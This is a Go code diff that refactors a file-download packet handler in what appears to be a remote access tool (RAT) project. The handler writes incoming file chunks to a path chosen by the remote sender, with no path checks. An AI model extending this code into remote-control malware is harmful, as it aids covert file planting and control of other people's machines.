@@ -1,12 +1,14 @@
 package main
 
 import (
-	"io"
 	"os"
 	"rat/common"
 )
 
 type DownloadPacket struct {
+	File  string `receive`
+	Final bool   `receive`
+	Part  []byte `receive`
 }
 
 type TransfersMap map[string]*os.File
@@ -17,26 +19,14 @@ func init() {
 	Transfers = make(TransfersMap)
 }
 
-func (packet DownloadPacket) GetHeader() common.PacketHeader {
+func (packet DownloadPacket) Header() common.PacketHeader {
 	return common.PutFileHeader
 }
 
-func (packet DownloadPacket) Write(c *Connection) error {
-	return nil
-}
+func (packet DownloadPacket) OnReceive() error {
+	file := packet.File
 
-func (packet DownloadPacket) Read(c *Connection) error {
-	file, err := c.ReadString()
-
-	if err != nil {
-		return err
-	}
-
-	final, err := c.ReadBool()
-
-	len, err := c.ReadInt()
-	b := make([]byte, len)
-	io.ReadFull(c.Conn, b)
+	var err error
 
 	if _, ok := Transfers[file]; !ok {
 		Transfers[file], err = os.Create(file)
@@ -46,13 +36,13 @@ func (packet DownloadPacket) Read(c *Connection) error {
 	}
 
 	w := Transfers[file]
-	_, err = w.Write(b)
+	_, err = w.Write(packet.Part)
 
 	if err != nil {
 		return err
 	}
 
-	if final {
+	if packet.Final {
 		err = w.Sync()
 		if err != nil {
 			return err
